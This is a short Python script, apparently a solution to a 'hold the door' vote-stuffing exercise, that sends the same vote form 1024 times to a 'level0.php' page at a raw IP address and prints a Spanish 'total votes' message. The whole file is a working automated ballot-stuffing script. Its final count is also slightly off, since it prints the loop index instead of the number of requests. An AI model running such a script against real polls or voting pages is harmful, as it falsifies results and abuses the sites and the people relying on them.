#!/usr/bin/python3
import requests
input = {'id': 3453452, 'holdthedoor': 'Submit'}
URL = 'http://158.69.76.135/level0.php'
for var1 in range (0, 1024):
    requests.post(URL, input)

print("Votos totales:{}".format(var1))
